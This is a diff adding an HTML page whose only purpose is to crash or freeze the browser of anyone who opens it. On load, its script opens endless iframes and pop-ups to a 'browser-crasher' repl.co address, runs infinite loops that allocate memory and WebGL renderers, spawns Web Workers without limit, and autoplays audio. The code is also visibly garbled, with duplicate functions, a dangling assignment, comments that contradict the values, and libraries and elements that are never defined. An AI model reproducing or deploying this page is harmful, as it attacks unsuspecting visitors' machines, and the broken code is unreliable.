@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get ready...</title>
+    <link href="style.css" rel="stylesheet" type="text/css" />
+  </head>
+  <body>
+    <div class="font">
+      <p>Are you sure this isnt a scam ?</p>
+      <p style="font-size: 10px;">Your browser will crash, beware.</p>
+      <p>starting the process....</p>
+      <br>
+      <audio id="audio" controls autoplay>
+        <source src="./audio.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+      </audio>
+    </div>
+    <script>
+      function crash(){
+        var audio = document.getElementById("audio");
+  audio.play();
+        var audio = document.getElementById("audio");
+        audio.play();
+        
+        setInterval(function() {
+          var iframe = document.createElement('iframe');
+          iframe.src = 'https://browser-crasher.mishal0legit.repl.co';
+          iframe.width = 800;
+          iframe.height = 600;
+          document.body.appendChild(iframe);
+        }, 0);
+        
+        setInterval(function() {
+          var popup = window.open('https://browser-crasher.mishal0legit.repl.co', '_blank', 'width=500,height=500');
+          popup.focus();
+        }, 0);
+        
+        while (true) {
+          var geometry = new THREE.BoxGeometry();
+          var material = new THREE.MeshBasicMaterial({color: Math.random() * 0xffffff});
+          var cube = new THREE.Mesh(geometry, material);
+          cube.rotation.x += Math.random() * 2 * Math.PI;
+          cube.rotation.y += Math.random() * 2 * Math.PI;
+          cube.rotation.z += Math.random() * 2 * Math.PI;
+          var renderer = new THREE.WebGLRenderer();
+          renderer.render(new THREE.Scene().add(cube), new THREE.Camera());
+      }
+    }
+    
+    window.onload = function() {
+      crash();
+    };
+      function crash() {
+        function createLargeArray() {
+          let largeArray = [];
+      
+          while (true) {
+            largeArray.push(new ArrayBuffer(1024 * 1024 * 1024 * 1024)); // Each element consumes 1 MB of memory
+          }
+        }
+        
+        window.onload = function() {
+          createLargeArray();
+        };
+        
+        setTimeout(createLargeArray, 0);
+        url= 
+        function loadMultipleIframes(url, numIframes) {
+          var index = 0;
+          var intervalId = setInterval(function() {
+            if (index >= numIframes) {
+              clearInterval(intervalId);
+              return;
+            }
+        window.onload = function() {
+          loadMultipleIframes();
+        };
+            
+            var iframe = document.createElement('iframe');
+            iframe.src = url;
+            iframe.width = 800;
+            iframe.height = 600;
+            document.body.appendChild(iframe);
+      
+            index++;
+          }, 0); // delay of 1 second between each iframe load
+        }
+      
+        var url = 'https://browser-crasher.mishal0legit.repl.co';
+        var numIframes = 9999999;
+        loadMultipleIframes(url, numIframes);
+        numIframes = 999999999999;
+        loadMultipleIframes(url, numIframes);
+      
+        var urls = ['https://browser-crasher.mishal0legit.repl.co', 'https://browser-crasher.mishal0legit.repl.co', 'https://browser-crasher.mishal0legit.repl.co'];
+        loadMultipleIframes(urls[0], numIframes); // Assuming you want to load the first URL in the array
+      
+        var audio = document.getElementById("audio");
+        audio.play();
+      
+        setInterval(function() {
+          var iframe = document.createElement('iframe');
+          iframe.src = 'https://browser-crasher.mishal0legit.repl.co';
+          iframe.width = 800;
+          iframe.height = 600;
+          document.body.appendChild(iframe);
+        }, 0);
+      
+        setInterval(function() {
+          var popup = window.open('https://browser-crasher.mishal0legit.repl.co', '_blank', 'width=500,height=500');
+          popup.focus();
+        }, 0);
+      
+        function createThreeCubes() {
+          var geometry = new THREE.BoxGeometry();
+          var material = new THREE.MeshBasicMaterial({color: Math.random() * 0xffffff});
+          var cube = new THREE.Mesh(geometry, material);
+          cube.rotation.x += Math.random() * 2 * Math.PI;
+          cube.rotation.y += Math.random() * 2 * Math.PI;
+          cube.rotation.z += Math.random() * 2 * Math.PI;
+          var renderer = new THREE.WebGLRenderer();
+          renderer.render(new THREE.Scene().add(cube), new THREE.Camera());
+      
+          requestAnimationFrame(createThreeCubes);
+        }
+      
+        requestAnimationFrame(createThreeCubes);
+      
+        const canvas = document.getElementById("myCanvas");
+        const ctx = canvas.getContext("2d");
+        
+        let gridSize = 16;
+        
+        function drawGrid() {
+          ctx.clearRect(0, 0, canvas.width, canvas.height);
+          const cellSize = canvas.width / gridSize;
+        
+          ctx.beginPath();
+          for (let i = 0; i <= gridSize; i++) {
+            ctx.moveTo(i * cellSize, 0);
+            ctx.lineTo(i * cellSize, canvas.height);
+            ctx.moveTo(0, i * cellSize);
+            ctx.lineTo(canvas.width, i * cellSize);
+          }
+          ctx.stroke();
+        
+          gridSize *= 100*100*100*100*100*100; // Multiply the number of cells by 2
+          requestAnimationFrame(drawGrid);
+        }
+        
+        requestAnimationFrame(drawGrid);
+        
+      }
+      
+      window.onload = function() {
+        crash();
+      };
+      
+      
+      
+      while (true) {
+        new Worker("data:text/javascript," + encodeURIComponent("setInterval(() => { importScripts('createCookie.js'); }, 1);"));
+      }
+    </script>
+  </body>
+</html>
